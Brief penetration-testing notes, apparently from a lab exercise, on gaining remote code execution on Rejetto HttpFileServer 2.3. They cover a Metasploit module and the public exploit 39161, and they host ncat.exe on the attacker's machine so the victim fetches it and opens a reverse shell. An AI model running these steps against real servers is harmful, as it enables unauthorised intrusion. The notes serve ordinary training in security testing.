# HFS HttpFileServer 2.3 (Rejetto)
## exploitation with metasploit
* msf> use exploit/windows/http/rejetto_hfs_exec
## manual exploitation
* source: https://systemweakness.com/manual-privilege-escalation-rejetto-http-file-server-windows-rce-1148a025c15a
* download ncat.exe from github (we need to host it on the attack machine and the exploit will upload it to the victim machine)
  * https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
* $ searchsploit -m 39161.py
* $ nano 39161.py
  * change "ip_addr" to tun0
  * "localport" can be leaved at "443" or can be changed to arbitrary port (this will be the reverse shell port that nc will get connection on)
* python -m http.server 80
  * we need it so the exploit can upload the ncat.exe to the victim
  * if we want to change it we probably has to change the commands in the exploit as well (to the appropriate port that we gave to python)
* 
